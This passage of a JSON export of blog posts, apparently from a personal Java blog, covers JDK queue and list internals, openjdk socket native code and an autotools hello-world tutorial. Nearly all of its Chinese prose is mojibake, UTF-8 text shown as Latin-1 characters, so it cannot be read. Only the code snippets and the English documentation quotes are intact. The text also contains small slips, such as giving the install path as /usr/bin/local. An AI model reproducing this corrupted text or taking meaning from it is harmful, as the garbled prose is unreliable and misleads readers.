å…¶å®å°±æ˜¯å…¸å‹çš„é€šçŸ¥æ¶ˆè´¹è€…ã€‚åŒç†ï¼Œdequeueé‡Œé¢æœ‰ä¸ªnotFull.signal()ï¼Œå°±æ˜¯é€šçŸ¥ç”Ÿäº§è€… åº•å±‚çš„æ•°ç»„æ˜¯ä¸ä¼šè‡ªåŠ¨æ‰©å®¹çš„ï¼Œä½†æ˜¯å¦‚æœä¸€ç›´æ·»åŠ å…ƒç´ ï¼Œè¶…å‡ºäº†åº•å±‚æ•°ç»„çš„é•¿åº¦çš„è¯ã€‚offerä¼šreturn false, putä¼šblockå½“å‰çº¿ç¨‹ï¼Œaddä¼šthrow new IllegalStateException(â€œQueue fullâ€); takeIndexå¯ä»¥çœ‹åšæ˜¯fifoé˜Ÿåˆ—çš„head, putIndexå¯ä»¥çœ‹åšæ˜¯fifoé˜Ÿåˆ—çš„tailï¼Œå› ä¸ºæ•°ç»„æœ¬èº«æ²¡æœ‰é˜Ÿåˆ—çš„æ¦‚å¿µï¼Œæ‰€ä»¥éœ€è¦äººä¸ºå»ç»´æŠ¤ä¸¤æ ¹æŒ‡é’ˆã€‚å¯ä»¥è®¤ä¸ºä»»ä½•æ—¶å€™ï¼Œåº•å±‚çš„æ•°ç»„ä¸­æ˜¯æœ‰ä¸€ä¸ªåŒºé—´æ˜¯å­˜æ”¾å…ƒç´ çš„ã€‚å…¶ä½™ä½ç½®éƒ½æ˜¯ç©ºçš„ã€‚æ¯”å¦‚éå†æ‰€æœ‰å…ƒç´ çš„æ–¹å¼æ˜¯ä»å–ä¸€ä¸ªint i, ä»takeIndexå¼€å§‹ä¸€ç›´åˆ°putIndex(ä¸­é€”å‡å¦‚ç¢°åˆ°äº†i= items.lengthï¼Œiå˜ä¸º0)ã€‚takeIndexå’ŒputIndexè°å¤§è°å°ä¸ä¸€å®šï¼Œéƒ½æ˜¯ä»0å¼€å§‹çš„ï¼Œå¹¶ä¸”éƒ½ä¼šå¾€åè‡ªå¢ï¼Œä¸€æ—¦è§¦ç¢°åˆ°items.lengthï¼Œä»0å†æ¥ã€‚æ‰€ä»¥éå†æ‰€æœ‰å…ƒç´ çš„è¿‡ç¨‹å°±åƒæ˜¯takeIndexå»è¿½èµ¶putIndexã€‚è¿™ç§åšæ³•åº”è¯¥å«åšä¸¤æ ¹æŒ‡é’ˆå¾ªç¯ä»æ•°ç»„ä¸­å–å…ƒç´ ã€‚ LinkedBlockingQueueçš„å®ç°LinkedBlockingQueueæ˜¯Executorsä¸­ä½¿ç”¨çš„åˆ›å»ºçº¿ç¨‹æ± çš„é™æ€æ–¹æ³•ä¸­ä½¿ç”¨çš„å‚æ•°ï¼Œæ˜¾ç„¶æ›´æ¨èä½¿ç”¨ã€‚ä¸»è¦ç”¨çš„æ˜¯ä¸¤ä¸ªæ–¹æ³•ï¼Œputæ–¹æ³•åœ¨é˜Ÿåˆ—æ»¡çš„æ—¶å€™ä¼šé˜»å¡ç›´åˆ°æœ‰é˜Ÿåˆ—æˆå‘˜è¢«æ¶ˆè´¹ï¼Œtakeæ–¹æ³•åœ¨é˜Ÿåˆ—ç©ºçš„æ—¶å€™ä¼šé˜»å¡ï¼Œç›´åˆ°æœ‰é˜Ÿåˆ—æˆå‘˜è¢«æ”¾è¿›æ¥ã€‚å®˜æ–¹æ–‡æ¡£æåˆ°äº†ï¼Œ LinkedBlockingQueueçš„ååé‡é€šå¸¸è¦é«˜äºåŸºäºæ•°ç»„çš„é˜Ÿåˆ—ï¼Œä½†åœ¨å¤§å¤šæ•°å¹¶å‘åº”ç”¨ç¨‹åºä¸­ï¼Œå…¶å¯é¢„çŸ¥çš„æ€§èƒ½è¦ä½ä¸€äº› ï¼Œ å†…éƒ¨çš„lockåªèƒ½æ˜¯unfairçš„ã€‚ LinkedBlockingQueueæ˜¯ç”¨å•å‘é“¾è¡¨å®ç°çš„ï¼Œä¸»è¦çš„æˆå‘˜å˜é‡åŒ…æ‹¬: /** The capacity bound, or Integer.MAX_VALUE if none */ private final int capacity; /** Current number of elements */ private final AtomicInteger count = new AtomicInteger(); /** * Head of linked list. * Invariant: head.item == null */ transient Node&lt;E&gt; head; /** * Tail of linked list. * Invariant: last.next == null */ private transient Node&lt;E&gt; last; /** Lock held by take, poll, etc */ private final ReentrantLock takeLock = new ReentrantLock(); /** Wait queue for waiting takes */ private final Condition notEmpty = takeLock.newCondition(); /** Lock held by put, offer, etc */ private final ReentrantLock putLock = new ReentrantLock(); /** Wait queue for waiting puts */ private final Condition notFull = putLock.newCondition(); ä¸»è¦å°±æ˜¯headå’Œlastä¸¤æ ¹æŒ‡é’ˆï¼Œå¤–åŠ ä¸€ä¸ªAtomicIntegerè®°å½•sizeï¼Œtakeé”å’Œputé”ä»¥åŠå¯¹åº”çš„ç”¨äºå”¤é†’ç­‰å¾…çš„çº¿ç¨‹ä»¬çš„conditionã€‚headå’Œlastçš„ç‰¹å¾æ˜¯å…¶item = null æ ¸å¿ƒæ–¹æ³•æ˜¯enqueueå’Œdequeue /** * Links node at end of queue. * * @param node the node */ private void enqueue(Node&lt;E&gt; node) { // assert putLock.isHeldByCurrentThread(); // assert last.next == null; last = last.next = node; } //è¿™é‡Œåº”è¯¥æ˜¯å…ˆæ‰§è¡Œå³è¾¹é‚£ä¸ª=ï¼Œå†æ‰§è¡Œå·¦è¾¹é‚£ä¸ª= ï¼Œ ä¹Ÿå°±æ˜¯æ‰€æœ‰çš„å…¥åˆ—å…ƒç´ éƒ½æ˜¯ä»¥nextçš„æ–¹å¼è¢«æ·»åŠ åˆ°å½“å‰çš„lastçš„nextä½ç½®ä¸Š /** * Removes a node from head of queue. * * @return the node */ private E dequeue() { // assert takeLock.isHeldByCurrentThread(); // assert head.item == null; Node&lt;E&gt; h = head; Node&lt;E&gt; first = h.next; h.next = h; // help GC //headè‡ªå·±æŒ‡å‘è‡ªå·±ï¼Ÿ head = first; E x = first.item; first.item = null; //headåé¢çš„å…ƒç´ å°±æ˜¯è¦è¢«ç§»é™¤çš„å…ƒç´  return x; } å…¥åˆ—çš„å‰ææ˜¯putLock.isHeldByCurrentThread()ï¼Œå‡ºåˆ—çš„å‰ææ˜¯takeLock.isHeldByCurrentThread() å¦‚æœè¦è·å–ï¼ˆtakeï¼‰ä¸€ä¸ªå…ƒç´ ï¼Œéœ€è¦è·å– takeLock é”ï¼Œä½†æ˜¯è·å–äº†é”è¿˜ä¸å¤Ÿï¼Œå¦‚æœé˜Ÿåˆ—æ­¤æ—¶ä¸ºç©ºï¼Œè¿˜éœ€è¦é˜Ÿåˆ—ä¸ä¸ºç©ºï¼ˆnotEmptyï¼‰è¿™ä¸ªæ¡ä»¶ï¼ˆConditionï¼‰ã€‚ å¦‚æœè¦æ’å…¥ï¼ˆputï¼‰ä¸€ä¸ªå…ƒç´ ï¼Œéœ€è¦è·å– putLock é”ï¼Œä½†æ˜¯è·å–äº†é”è¿˜ä¸å¤Ÿï¼Œå¦‚æœé˜Ÿåˆ—æ­¤æ—¶å·²æ»¡ï¼Œè¿˜éœ€è¦é˜Ÿåˆ—ä¸æ˜¯æ»¡çš„ï¼ˆnotFullï¼‰è¿™ä¸ªæ¡ä»¶ï¼ˆConditionï¼‰ã€‚ ä»¥ä¸Šçš„ArrayBlockingQueueå’ŒLinkedBlockingQueueéƒ½è¿˜ç®—ç®€å•ï¼ŒSynchronousQueueçš„å®ç°åˆ™è¾ƒä¸ºå¤æ‚ PriorityBlockingQueuePriority queue represented as a balanced binary heapï¼ŒThe element with the lowest value is in queue[0]ï¼ˆæ‰€ä»¥æ˜¯ä¸€ä¸ªå¹³è¡¡å°é¡¶å †ï¼‰ DelayQueueå¹¶å‘åŒ…ä¸‹é¢çš„å»¶æ—¶é˜»å¡é˜Ÿåˆ—ï¼Œé™„å¸¦ä¸€ä¸ªDelayedæ¥å£ç”¨äºç”¨äºå®ç°å®šæ—¶ä»»åŠ¡ public interface Delayed extends Comparable&lt;Delayed&gt; { long getDelay(TimeUnit unit); } public class DelayQueue&lt;E extends Delayed&gt; extends AbstractQueue&lt;E&gt; implements BlockingQueue&lt;E&gt; { } é˜Ÿåˆ—ä¸­çš„å…ƒç´ éƒ½å®ç°äº†Delayedçš„æ¥å£ï¼Œé€šè¿‡getDelayæ–¹æ³•å®ç°å»¶è¿Ÿè°ƒåº¦ã€‚åœ¨queue.take()çš„æ—¶å€™è¢«addè¿›queueçš„å…ƒç´ æŒ‰ç…§getDelayçš„è¿”å›å€¼æ’åºï¼Œè¶Šæ—©åˆ°æœŸçš„å…ƒç´ è¶Šå…ˆå‡ºé˜Ÿã€‚ ScheduledThreadPoolExecutorä¸­ä½¿ç”¨äº†å†…éƒ¨å®ç°ç±»DelayedWorkQueueï¼Œè€Œæ˜¯ä½¿ç”¨æ•°ç»„åˆå®ç°äº†ä¸€éä¼˜å…ˆçº§é˜Ÿåˆ—ï¼Œæœ¬è´¨ä¸Šæ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚è¯¦ç»†ä»‹ç» ArrayDequeåŒç«¯é˜Ÿåˆ—æ˜¯ä¸€ç§ç‰¹æ®Šçš„é˜Ÿåˆ—ï¼Œå®ƒçš„ä¸¤ç«¯éƒ½å¯ä»¥è¿›å‡ºå…ƒç´ ï¼Œæ•…è€Œå¾—ååŒç«¯é˜Ÿåˆ—ã€‚ArrayDequeæ˜¯ä¸€ç§ä»¥æ•°ç»„æ–¹å¼å®ç°çš„åŒç«¯é˜Ÿåˆ—ï¼Œå®ƒæ˜¯éçº¿ç¨‹å®‰å…¨çš„ã€‚Dequeæ˜¯ä¸€ä¸ªæ¥å£,å®šä¹‰äº†addFirst,addLast, removeFirst, removeLastç­‰æ“ä½œï¼Œå› æ­¤å¯ä»¥ä»ä¸¤ç«¯è¿›è¡Œæ“ä½œã€‚ ArrarDequeçš„æ„é€ å‡½æ•°ä¹Ÿå¯ä»¥ä¼ å…¥sizeï¼Œé»˜è®¤åˆå§‹å®¹é‡æ˜¯16ï¼Œæœ€å°å®¹é‡æ˜¯8ã€‚å¿…é¡»æ˜¯2çš„å¹‚ å†…éƒ¨ç»´æŠ¤äº†ä¸€ä¸ªelements(Object[]) ,åŒæ—¶è¿˜æœ‰ä¸¤æ ¹æŒ‡é’ˆheadï¼ˆä¸‹ä¸€æ¬¡removeå’Œpopçš„ä½ç½®ï¼‰å’Œtail(ä¸‹ä¸€æ¬¡addçš„ä½ç½®) addæ“ä½œç­‰åŒäºaddLastã€‚ headå’Œtailéƒ½æ˜¯ä»0å¼€å§‹çš„ã€‚addLastæ“ä½œä½¿å¾—tail+1ï¼Œheadä¸å˜ã€‚ç¬¬ä¸€æ¬¡addFirstæ“ä½œä½¿å¾—headä»0å˜ä¸ºlength-1ï¼ˆæ¯”å¦‚è¯´7ï¼‰ï¼Œéšåçš„addFirstæ“ä½œä½¿å¾—headé€’å‡ã€‚å½“head==tailçš„æ—¶å€™ï¼ŒdoubleCapacityã€‚ getFirstçš„åšæ³• (E) elements[head]; getLastç”¨çš„æ˜¯è¿™æ ·çš„ (E) elements[(tail - 1) &amp; (elements.length - 1)]; é€šè¿‡å–æ¨¡çš„æ–¹å¼è®©å¤´å°¾æŒ‡é’ˆåœ¨æ•°ç»„èŒƒå›´å†…å¾ªç¯ï¼Œx &amp; (len â€“ 1) = x % lenï¼Œä½¿ç”¨&amp;çš„æ–¹å¼æ›´å¿«ï¼›è¿™ä¹Ÿæ˜¯æ•°ç»„é•¿åº¦å¿…é¡»ä¸º2çš„æŒ‡æ•°å¹‚çš„åŸå› ã€‚6.doubleCapacity(æ‰©å®¹çš„æ–¹å¼æœ‰ç‚¹ç»•)ï¼Œæ‰©å®¹æ—¶,head==tailã€‚ä»¥headä¸ºè¾¹ç•Œï¼Œå³è¾¹çš„æŒªåˆ°x2ä¹‹åæ•°ç»„çš„æœ€å¼€å¤´ï¼Œå·¦è¾¹çš„è·Ÿç€æŒªåˆ°ä¸Šè¿°æ•°æ®çš„åé¢ï¼Œè¿™æ ·å¡«æ»¡x2æ•°ç»„çš„å·¦åŠéƒ¨åˆ†ï¼ŒåŒæ—¶ä¿è¯äº†head=0ï¼Œtailåœ¨æœ€å°¾éƒ¨ã€‚ é€šè¿‡å–æ¨¡çš„æ–¹å¼è®©å¤´å°¾æŒ‡é’ˆåœ¨æ•°ç»„èŒƒå›´å†…å¾ªç¯ï¼ˆheadå¾€å·¦èµ°ï¼Œtailå¾€å³èµ°ï¼Œä¸¤è€…ç›¸é‡åæ‰©å®¹ï¼‰ è¯¦ç»†ä»‹ç»","tags":[]},{"title":"jdké›†åˆç±»æºç åˆ†æ[list]","date":"2019-09-14T15:44:09.000Z","path":"2019/09/14/2019-09-14-collections-Refuled-01/","text":"æºç ï¼Œä»¥åŠjdk8ä¸­çš„ä¸€äº›æœ‰ç”¨çš„methodã€‚ public interface List&lt;E&gt; extends Collection&lt;E&gt; { } Listçš„å®ç°ç±»åŒ…æ‹¬ArrayList,LinkedList,CopyOnWriteArrayList,ä»¥åŠä¸¤ä¸ªä¸æ€ä¹ˆç”¨çš„ç±»stackå’ŒVector 1. ArrayList2. LinkedList3. CopyOnWriteArrayListå†…éƒ¨æ•°ç»„æ˜¯ä¸€ä¸ªvolatileçš„ã€‚æ‰€æœ‰çš„mutateæ“ä½œéƒ½è¢«ä¸€ä¸ªReentrantLockä¿æŠ¤(all mutative operations ({@code add}, {@code set}, and so on) are implemented by making a fresh copy of the underlying array.) æ­¤ç±»æ“ä½œéƒ½æ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„arrayï¼Œå†é€šè¿‡setArrayæ–¹æ³•è®¾ç½®è¿™ä¸ªvolatileçš„å€¼æ‰€æœ‰çš„émutateæ“ä½œ(get, size ,indexOfç­‰)éƒ½æ˜¯é€šè¿‡ä¸€ä¸ªgetArrayæ–¹æ³•å…ˆè·å–åˆ°è¿™ä¸ªç¡®è®¤CopyOnWriteArrayListæ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ ä»»ä¸€çº¿ç¨‹å¯¹ç»“æ„çš„ä¿®æ”¹éƒ½ä¼šç›´æ¥è¢«åç»­çš„è¯»çš„çº¿ç¨‹çœ‹åˆ°ã€‚ ç¼ºç‚¹å°±æ˜¯è¿™ç§å®¹å™¨åªé€‚ç”¨äºread å¤š writeå°‘çš„åœºæ™¯ã€‚ An important detail is that volatile only applies to the array reference itself, not to the content of the array. However because all changes to the array are made before its reference is published, the volatile guarantees extend to the content of the array volatileåªæ˜¯ä¿è¯äº†æ•°ç»„çš„æŒ‡é’ˆæ˜¯volatileçš„ï¼Œä½†äº‹å®ä¸Šå› ä¸ºä¿®æ”¹arrayå¼•ç”¨çš„åœ°æ–¹åªæœ‰setArrayæ–¹æ³•ï¼ˆæ”¹æ–¹æ³•åŒ…åœ¨é”é‡Œï¼ŒåŒæ—¶åªæœ‰ä¸€æ¡çº¿ç¨‹å¯ä»¥è°ƒç”¨ï¼‰ã€‚å› æ­¤arrayçš„å†…å®¹äº‹å®ä¸Šç­‰åŒäºæ˜¯volatileçš„ã€‚ç”±äºhappen-beforeåŸåˆ™çš„å­˜åœ¨ï¼Œadd(obj)ä¸€å®šå‘ç”Ÿåœ¨indexOf(obj)ä¹‹å‰ã€‚ è¿˜æ˜¯æœ‰å´©çš„å¯èƒ½å…·ä½“å°±æ˜¯CopyOnWriteå®¹å™¨åªèƒ½ä¿è¯æ•°æ®çš„æœ€ç»ˆä¸€è‡´æ€§ï¼Œä¸èƒ½ä¿è¯æ•°æ®çš„å®æ—¶ä¸€è‡´æ€§ã€‚æ‰€ä»¥å¦‚æœä½ å¸Œæœ›å†™å…¥çš„çš„æ•°æ®ï¼Œé©¬ä¸Šèƒ½è¯»åˆ°ï¼Œè¯·ä¸è¦ä½¿ç”¨CopyOnWriteå®¹å™¨ã€‚(CopyOnWriteArrayListåªæ˜¯ä¿è¯äº†readèƒ½å¤Ÿåæ˜ ä¸Šä¸€æ¬¡writeçš„ç»“æœ)æ¯”å¦‚äº²æµ‹ä¸‹é¢è¿™æ®µä»£ç ä¼šå´© public class CrashOfCopyOnWriteArrayList { void test(){ CopyOnWriteArrayList&lt;String&gt; list = new CopyOnWriteArrayList&lt;&gt;(); for(int i = 0; i&lt;10000; i++){ list.add(&quot;string&quot; + i); } new Thread(new Runnable() { @Override public void run() { while (true) { int size = list.size(); if (size &gt; 0) { String content = list.get(size - 1); //å´©åœ¨è¿™é‡Œçš„æ•°ç»„è¶Šç•Œ }else { break; } } } }).start(); new Thread(new Runnable() { @Override public void run() { while (true) { if(list.size() &lt;= 0){ break; } list.remove(0); } } }).start(); } public static void main(String[] args) { new CrashOfCopyOnWriteArrayList().test(); } } å‚è€ƒã€æ­»ç£• Java é›†åˆã€‘â€” æ€»ç»“ç¯‡[Javaé›†åˆæ¡†æ¶å¸¸è§é¢è¯•é¢˜](https://github.com/Snailclimb/JavaGuide/blob/master/docs/java/collection/Javaé›†åˆæ¡†æ¶å¸¸è§é¢è¯•é¢˜.mdï¼‰","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"openjdkæºç è§£æ[äºŒ]","date":"2019-09-06T21:06:23.000Z","path":"2019/09/06/2019-09-06-openjdk-codegrep_02/","text":"æ¶‰åŠsocketçš„ä¸€äº›class,java.net.xxx java socketç¼–ç¨‹ä¸»è¦æ˜¯tcpå’Œudpç¼–ç¨‹ï¼Œæ¶‰åŠåˆ°çš„classåŒ…æ‹¬socket(tcp client)å’ŒServerSocket(tcp server)ä»¥åŠDatagramSocket(udp)ï¼Œä¸»è¦çš„ç±»éƒ½åœ¨java.netè¿™ä¸ªpackageä¸‹é¢ã€‚å¸¸ç”¨çš„åŒ…æ‹¬ï¼šå¤„ç†httpè¯·æ±‚çš„HttpURLConnectionï¼Œä»£è¡¨èµ„æºåœ°å€çš„URL(ä¸æ˜¯URI)ï¼ŒSocketInputStreamå’ŒSocketOutputStreamã€‚ URLæ˜¯å¯¹ä¸€ä»½èµ„æºåœ°å€çš„è¡¨ç¤ºpublic class URLDemo { public static void main(String[] args) { try { URL url = new URL(&quot;https://www.baidu.com/abced.html?language=zh_CN#ssss-libev&quot;); System.out.println(url); System.out.println(url.getProtocol()); // https System.out.println(url.getHost()); // www.baidu.com System.out.println(url.getPort()); // -1 System.out.println(url.getDefaultPort()); // 443 System.out.println(url.getFile()); // /abced.html?language=zh_CN System.out.println(url.getPath()); // /abced.html System.out.println(url.getQuery()); // language=zh_CN System.out.println(url.getRef()); // ssss-libev } catch (MalformedURLException e) { e.printStackTrace(); } } } tcp socketSocketå’ŒServerSocketï¼Œè¿™ä¿©ä¸€ä¸ªä»£è¡¨tcpé€šä¿¡çš„å®¢æˆ·ç«¯ï¼Œä¸€ä¸ªä»£è¡¨æœåŠ¡ç«¯ã€‚ä»æºç æ¥çœ‹,ServerSocketå’Œsocketå†…éƒ¨åˆ†åˆ«æŒæœ‰ä¸€ä¸ªSocketImplå¯¹è±¡ï¼Œç”¨äºå°†å¯¹åº”çš„æ–¹æ³•ä»£ç†ç»™nativeæ–¹æ³•ã€‚ ServerSocketä¸»è¦çš„æ–¹æ³•åŒ…æ‹¬ //å‡ ä¸ªæ„é€ å‡½æ•° public ServerSocket() throws IOException; public ServerSocket(int port) throws IOException; public ServerSocket(int port, int backlog, InetAddress bindAddr) throws IOException ; //ç»‘å®šç«¯å£ public void bind(SocketAddress endpoint) throws IOException public void bind(SocketAddress endpoint, int backlog) throws IOException //å¼€å§‹æ¥å—clientçš„è¯·æ±‚ public Socket accept() throws IOException //è¿˜æœ‰ä¸€äº›è®¾ç½®è¶…æ—¶ä»€ä¹ˆçš„ public synchronized void setSoTimeout(int timeout) throws SocketException public void setReuseAddress(boolean on) throws SocketException public synchronized void setReceiveBufferSize (int size) throws SocketException åˆ†åˆ«æ¥çœ‹ï¼šæ„é€ å‡½æ•°ä¸­é»˜è®¤åˆ›å»ºäº†ä¸€ä¸ªSocksSocketImplï¼ˆè¿™æ˜¯ä¸€ä¸ªSOCKS (V4 &amp; V5) TCP socket implementationï¼Œå°±æ˜¯ä¸€ä¸ªæ”¯æŒsocksåè®®çš„socketå®ç°ï¼‰ã€‚SocksSocketImplç»§æ‰¿è‡ªPlainSocketImplç»§æ‰¿è‡ªAbstractPlainSocketImplã€‚æ³¨æ„è¿™äº›çˆ¶ç±»ä¸­éƒ½æœ‰ä¸€æ®µstatic ä»£ç å—ï¼Œæ‰€ä»¥åˆ›å»ºäº†å­ç±»çš„æ—¶å€™è¿™äº›çˆ¶ç±»çš„ä»£ç å—éƒ½ä¼šè¢«æ‰§è¡Œï¼š class PlainSocketImpl extends AbstractPlainSocketImpl { static { initProto(); } static native void initProto(); } abstract class AbstractPlainSocketImpl extends SocketImpl { static { java.security.AccessController.doPrivileged( new java.security.PrivilegedAction&lt;Void&gt;() { public Void run() { System.loadLibrary(&quot;net&quot;); return null; } }); } } initProtoä¸»è¦æ˜¯ä¸ºäº†cache filed id æ¥ä¸‹æ¥æ˜¯bindæ–¹æ³•,serverSocketä¸­çš„å®ç°æ˜¯ getImpl().bind(epoint.getAddress(), epoint.getPort()); getImpl().listen(backlog); //è¿™ä¸ªbacklogé»˜è®¤æ˜¯50 æ‰€ä»¥æ˜¯åŒæ—¶åšäº†ä¸¤ä»¶äº‹ï¼Œbindå’Œlistenã€‚åˆ†åˆ«è°ƒç”¨åˆ°äº†: native void socketBind(InetAddress address, int port) throws IOException; native void socketListen(int count) throws IOException; å¯¹åº”çš„cè¯­è¨€å®ç°æ˜¯:socketListen JNIEXPORT void JNICALL Java_java_net_PlainSocketImpl_socketListen (JNIEnv *env, jobject this, jint count) { /* this FileDescriptor fd field */ jobject fdObj = (*env)-&gt;GetObjectField(env, this, psi_fdID); /* fdObj&#39;s int fd field */ int fd; if (IS_NULL(fdObj)) { JNU_ThrowByName(env, JNU_JAVANETPKG &quot;SocketException&quot;, &quot;Socket closed&quot;); return; } else { fd = (*env)-&gt;GetIntField(env, fdObj, IO_fd_fdID); } /* * Workaround for bugid 4101691 in Solaris 2.6. See 4106600. * If listen backlog is Integer.MAX_VALUE then subtract 1. */ if (count == 0x7fffffff) count -= 1; if (JVM_Listen(fd, count) == JVM_IO_ERR) { NET_ThrowByNameWithLastError(env, JNU_JAVANETPKG &quot;SocketException&quot;, &quot;Listen failed&quot;); } } æ‰€ä»¥æ˜¯è°ƒç”¨äº†JVM_Listenè¿™ä¸ªæ–¹æ³•,å†å¾€ä¸‹å°±æ˜¯cppäº†ï¼Œåœ¨/hotspot/src/share/vm/prims/jvm.cppè¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œè°ƒç”¨çš„æ˜¯os:listenå‡½æ•°ï¼Œè¿™é‡Œåº”è¯¥æ˜¯è™šæ‹Ÿæœºçš„å®ç°äº†ã€‚ä¸å‡ºæ„å¤–çš„ï¼ŒJVM_Bindè¿™ä¸ªæ–¹æ³•ä¹Ÿå‡ºç°åœ¨jvm.cppè¿™ä¸ªæ–¹æ³•ä¸­ã€‚ åœ¨hostspotä¸­ï¼Œosæ˜¯ä¸€ä¸ªå°è£…ç‰¹å®šæ“ä½œç³»ç»Ÿè¡Œä¸ºçš„é™æ€ç±»ï¼Œå…¶å®ç°å¤šåœ¨hotspot/src/osä¸­ã€‚ ä»¥linuxä¸ºä¾‹ï¼Œå®ç°åœ¨os_linux.inline.hpp inline int os::bind(int fd, struct sockaddr* him, socklen_t len) { return ::bind(fd, him, len); } åº”è¯¥æ˜¯è°ƒç”¨äº†bindè¿™ä¸ªlinuxå‡½æ•°ã€‚ udp sockettbd, å®åœ¨å¤ªå¤šäº† socketXXXStreamå¤§éƒ¨åˆ†çš„nativeæ–¹æ³•éƒ½åœ¨plainSocketImpl.javaä¸­ native void socketCreate(boolean isServer) throws IOException; native void socketConnect(InetAddress address, int port, int timeout) throws IOException; native void socketBind(InetAddress address, int port) throws IOException; native void socketListen(int count) throws IOException; native void socketAccept(SocketImpl s) throws IOException; native int socketAvailable() throws IOException; native void socketClose0(boolean useDeferredClose) throws IOException; native void socketShutdown(int howto) throws IOException; static native void initProto(); native void socketSetOption0(int cmd, boolean on, Object value) throws SocketException; native int socketGetOption(int opt, Object iaContainerObj) throws SocketException; native void socketSendUrgentData(int data) throws IOException; ä¸Šé¢çš„æ–¹æ³•åŸºæœ¬ä¸Šçœ‹åå­—å°±èƒ½è·Ÿå¯¹åº”çš„javaæ–¹æ³•å¯¹ä¸Šå·ï¼Œè¿™é‡Œè¯´ä¸€ä¸ªsocketAvailable,è¿™ä¸ªåº”è¯¥æ˜¯å¯¹åº”socketInputStreamçš„available(è¿™ä¸ªæ–¹æ³•æ˜¯inputStreamè¦æ±‚çš„)ã€‚é‚£ä¹ˆå®ƒçš„å¯¹åº”çš„c++æ–¹æ³•æ˜¯JVM_SocketAvailable int os::socket_available(int fd, jint *pbytes) { // Linux doc says EINTR not returned, unlike Solaris int ret = ::ioctl(fd, FIONREAD, pbytes); //%% note ioctl can return 0 when successful, JVM_SocketAvailable // is expected to return 0 on failure and 1 on success to the jdk. return (ret &lt; 0) ? 0 : 1; } æ‰€ä»¥è¿™ä¸ªæ–¹æ³•è¿”å›çš„è¦ä¹ˆæ˜¯0è¦ä¹ˆæ˜¯1ï¼Ÿçœ‹ä¸€ä¸‹oracleçš„java doc public int availableâ€‹() throws IOException Returns an estimate of the number of bytes that can be read (or skipped over) from this input stream without blocking by the next invocation of a method for this input stream. The next invocation might be the same thread or another thread. A single read or skip of this many bytes will not block, but may read or skip fewer bytes. Note that while some implementations of InputStream will return the total number of bytes in the stream, many will not. It is never correct to use the return value of this method to allocate a buffer intended to hold all data in this stream. A subclass&#39; implementation of this method may choose to throw an IOException if this input stream has been closed by invoking the close() method. The available method for class InputStream always returns 0. This method should be overridden by subclasses. ä¹Ÿå°±æ˜¯è¯´å¤šæ•°subclassçš„å®ç°ä¸­è¿”å›çš„å€¼ï¼Œæ˜¯é ä¸ä½çš„ï¼Œå¯èƒ½ä¼šå°ã€‚æ‰€ä»¥ä¾èµ–è¿™ä¸ªè¿”å›å€¼allocateä¸€ä¸ªbufferåŒºå­˜å‚¨åº•å±‚çš„æ•°æ®æ˜¯ä¸æ­£ç¡®çš„ã€‚ tbdè¿™ä¹ˆå†™ä¸‹å»ï¼Œè™šæ‹Ÿæœºçš„ä¸œè¥¿å¤ªå¤šäº†ã€‚ã€‚ã€‚ å‚è€ƒjava socketç¼–ç¨‹","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"automakeæ•™ç¨‹","date":"2019-08-25T08:46:19.000Z","path":"2019/08/25/2019-08-25-autotools-tutorials/","text":"autotoolsçš„ä½¿ç”¨æ–¹å¼ 1.ä»€ä¹ˆæ˜¯AutoToolsThe GNU build system, also known as the Autotools, is a suite of programming tools designed to assist in making source code packages portable to many Unix-like systems.â€”â€”Wikipedia ä»ä½¿ç”¨ä¸Šæ¥è®²ï¼Œå¤šæ•°unixè½¯ä»¶çš„å®‰è£…æ–¹å¼éƒ½æ˜¯ä¸‹è½½ä¸€ä¸ªtarball,configureï¼Œmake,make installï¼Œå°±è¿™ä¹ˆç®€å•ã€‚èƒŒåä½¿ç”¨çš„å°±æ˜¯autotoolsã€‚ ä¸»è¦å°±æ˜¯ä¸ºäº†ç”ŸæˆMakefileã€‚ ä»æœ€ç®€å•çš„helloworldå¼€å§‹è¯´èµ·å§å‚è€ƒ æœ€ç»ˆå¯ä»¥ç”Ÿæˆä¸€ä¸ªtar.gzã€‚ï¼ˆéœ€è¦æ‰‹å†™çš„å°±åªæœ‰Makefile.amæ–‡ä»¶ï¼Œconfigure.acæ–‡ä»¶æ˜¯ä»configure.scanæ–‡ä»¶é‡å‘½åå¤–åŠ ä¿®æ”¹ä¸€ç‚¹ç‚¹è¿‡æ¥çš„ï¼‰ åˆ›å»ºä¸‰ä»½æ–‡ä»¶: cat main.c #include &lt;stdio.h&gt; int main(int argc, char* argv[]) { printf(&quot;Hello world\\n&quot;); return 0; } cat Makefile.am AUTOMAKE_OPTIONS = foreign bin_PROGRAMS = helloworld helloworld_SOURCES = main.c cat configure.ac AC_INIT([helloworld], [0.1], [myemail@example.com]) AM_INIT_AUTOMAKE AC_PROG_CC AC_CONFIG_FILES([Makefile]) AC_OUTPUT ä¾æ¬¡æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼šaclocal # Set up an m4 environmentautoconf # Generate configure from configure.acautomake â€“add-missing # Generate Makefile.in from Makefile.am./configure # Generate Makefile from Makefile.inmake dist # ä¼šç”Ÿæˆä¸€ä¸ª.tar.gzæ–‡ä»¶make distcheck # Use Makefile to build and test a tarball to distribute æƒ³è¦ä½¿ç”¨ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶çš„è¯, sudo make install(ä¼šå¤åˆ¶å¯æ‰§è¡Œæ–‡ä»¶åˆ° /usr/bin/localæ–‡ä»¶å¤¹ä¸­) ï¼Œæ”¾å¿ƒ make uninstall ä¹Ÿæœ‰ï¼Œå°±æ˜¯æŠŠè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ç»™åˆ é™¤æ‰ å…¶ä»–GNU Autotools ä¸€èˆ¬æŒ‡çš„æ˜¯3ä¸ª GNU å·¥å…·åŒ…ï¼šAutoconfï¼ŒAutomake å’Œ Libtoolå®ƒä»¬èƒ½è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Œè¦å…ˆä» GNU å¼€æºè½¯ä»¶çš„ Build ç³»ç»Ÿè¯´èµ·ã€‚ä¸€èˆ¬æ¥è¯´ã€‚GNU è½¯ä»¶çš„å®‰è£…è¿‡ç¨‹éƒ½æ˜¯ï¼š è§£å‹æºä»£ç 